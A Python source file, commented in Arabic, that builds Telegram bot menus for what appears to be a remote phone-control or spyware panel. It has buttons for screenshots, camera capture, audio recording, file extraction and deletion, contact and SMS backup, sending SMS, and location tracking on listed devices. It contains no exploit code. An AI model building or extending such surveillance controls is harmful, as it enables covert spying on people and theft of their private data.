"""
بناء أزرار القوائم
"""
from typing import Dict
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from models.device import Device


class MenuKeyboards:
    """مُنشئ لوحات المفاتيح (الأزرار)."""

    @staticmethod
    def main_menu(devices_count: int = 0) -> InlineKeyboardMarkup:
        """أزرار القائمة الرئيسية."""
        keyboard = [
            [InlineKeyboardButton("📱 عرض الأجهزة", callback_data="list_devices")],
            [InlineKeyboardButton("📋 التعليمات", callback_data="help")],
        ]
        if devices_count > 0:
            keyboard.append([InlineKeyboardButton("🔄 تحديث القائمة", callback_data="refresh")])
        return InlineKeyboardMarkup(keyboard)

    @staticmethod
    def devices_list(devices: Dict[str, Device]) -> InlineKeyboardMarkup:
        """أزرار قائمة الأجهزة."""
        keyboard = []
        if devices:
            for device_id, device in devices.items():
                name = device.get_display_name()
                status = "🟢" if device.is_active else "🔴"
                keyboard.append([
                    InlineKeyboardButton(
                        f"{status} {name}",
                        callback_data=f"device_{device_id}"
                    )
                ])
        else:
            keyboard.append([
                InlineKeyboardButton("❌ لا توجد أجهزة مسجلة", callback_data="none")
            ])

        keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)

    @staticmethod
    def device_controls(device: Device) -> InlineKeyboardMarkup:
        """أزرار التحكم بجهاز معين."""
        device_id = device.device_id

        keyboard = [
            # المجموعة 1: التصوير والتسجيل
            [
                InlineKeyboardButton("📸 تصوير شاشة", callback_data=f"cmd_{device_id}_screenshot"),
                InlineKeyboardButton("🤳 كاميرا أمامية", callback_data=f"cmd_{device_id}_camera_front"),
            ],
            [
                InlineKeyboardButton("📷 كاميرا خلفية", callback_data=f"cmd_{device_id}_camera_back"),
                InlineKeyboardButton("🎙️ تسجيل صوت", callback_data=f"cmd_{device_id}_record_audio"),
            ],
            # المجموعة 2: الملفات والمجلدات
            [
                InlineKeyboardButton("📁 إرسال مجلد", callback_data=f"cmd_{device_id}_send_folder"),
                InlineKeyboardButton("📄 إرسال ملف", callback_data=f"cmd_{device_id}_send_file"),
            ],
            [
                InlineKeyboardButton("🗑️ حذف ملف/مجلد", callback_data=f"cmd_{device_id}_delete"),
            ],
            # المجموعة 3: النسخ الاحتياطي والرسائل
            [
                InlineKeyboardButton("👥 نسخ جهات الاتصال", callback_data=f"cmd_{device_id}_backup_contacts"),
                InlineKeyboardButton("💬 نسخ الرسائل النصية", callback_data=f"cmd_{device_id}_backup_sms"),
            ],
            [
                InlineKeyboardButton("📨 إرسال رسالة نصية", callback_data=f"cmd_{device_id}_send_sms"),
            ],
            # المجموعة 4: معلومات الجهاز
            [
                InlineKeyboardButton("📊 معلومات الجهاز", callback_data=f"cmd_{device_id}_device_info"),
                InlineKeyboardButton("🔋 حالة البطارية", callback_data=f"cmd_{device_id}_battery_status"),
            ],
            [
                InlineKeyboardButton("📍 الموقع الحالي", callback_data=f"cmd_{device_id}_location"),
            ],
            # أزرار مساعدة
            [
                InlineKeyboardButton("🔄 إعادة تشغيل الخدمة", callback_data=f"cmd_{device_id}_restart_service"),
            ],
            [
                InlineKeyboardButton("🔙 العودة إلى الأجهزة", callback_data="back_devices"),
                InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_main"),
            ],
        ]
        return InlineKeyboardMarkup(keyboard)

    @staticmethod
    def cancel_button() -> InlineKeyboardMarkup:
        """زر إلغاء العملية."""
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_command")]
        ])

    @staticmethod
    def back_button(callback: str = "back_main") -> InlineKeyboardMarkup:
        """زر العودة."""
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 العودة", callback_data=callback)]
        ])